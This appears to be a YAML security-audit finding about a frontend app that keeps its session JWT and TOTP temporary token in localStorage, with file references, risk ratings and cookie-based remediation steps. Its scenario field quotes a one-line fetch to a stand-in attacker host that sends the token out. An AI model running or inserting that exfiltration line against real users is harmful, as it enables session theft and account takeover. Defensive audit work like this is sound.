threats:
- local_id: frontend-spa-005
  threat_category_id: TH-04
  additional_categories: []
  stride: Information Disclosure
  cwe: CWE-922
  title: Insecure Client-Side Storage JWT and TOTP Token in — request.interceptor.ts:13
  affected_parameter: token
  scenario: 'The session JWT is stored in `localStorage` at `oauth.component.ts:51` and read at `request.interceptor.ts:13,16`
    to populate every outbound `Authorization: Bearer` header. Additionally, the TOTP temporary token (`totp_tmp_token`) is
    written to `localStorage` at `login.component.ts:120`. Because `localStorage` is accessible to any JavaScript running
    in the origin — including XSS payloads, browser extensions, and injected scripts — the JWT can be exfiltrated by a single
    line: `fetch(''https://attacker.com?t=''+localStorage.getItem(''token''))`. Any of the two reflected/stored XSS findings
    (frontend-spa-003, frontend-spa-004) converts directly into full session takeover via this surface. This is an architectural
    anti-pattern: tokens should be held in `HttpOnly Secure SameSite=Strict` cookies, opaque to JavaScript.'
  evidence_summary: '`request.interceptor.ts:13` reads `localStorage.getItem(''token'')` for every HTTP request; `oauth.component.ts:51`
    writes `localStorage.setItem(''token'', authentication.token)` on OAuth login.'
  impact_description: Any XSS payload can read the session JWT from localStorage and send it to an attacker-controlled endpoint,
    achieving full account takeover without the user's knowledge.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: None — localStorage is used by design as documented in the component description.
  mitigation_title: Migrate session token storage from localStorage to HttpOnly Secure SameSite=Strict cookies via a Backend-for-Frontend
  remediation:
    effort: High
    steps:
    - Introduce a Backend-for-Frontend (BFF) layer that sets the session JWT as an `HttpOnly; Secure; SameSite=Strict` cookie
      on successful login, replacing the current `localStorage.setItem('token', ...)` pattern.
    - Remove `localStorage.getItem('token')` from `request.interceptor.ts`; instead rely on the browser automatically attaching
      the cookie to same-site requests.
    - Remove `totp_tmp_token` from `localStorage` (`login.component.ts:120`) — store it in `sessionStorage` scoped to the
      current tab as an interim step, pending full BFF migration.
    - Remove `localStorage.setItem('token', ...)` from `oauth.component.ts:51` once the cookie-based flow is in place.
    code_example: null
    reference: CWE-922
  evidence:
